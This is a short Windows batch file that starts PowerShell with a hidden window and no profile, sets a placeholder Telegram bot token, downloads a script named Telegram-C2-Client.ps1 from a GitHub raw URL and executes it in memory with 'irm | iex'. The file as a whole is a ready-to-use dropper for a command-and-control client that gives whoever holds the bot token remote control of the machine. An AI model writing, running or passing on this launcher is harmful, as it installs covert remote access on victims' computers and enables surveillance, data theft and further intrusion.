@echo off
powershell.exe -NonI -NoP -W H -C "$tg='TELEGRAM_BOT_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex"
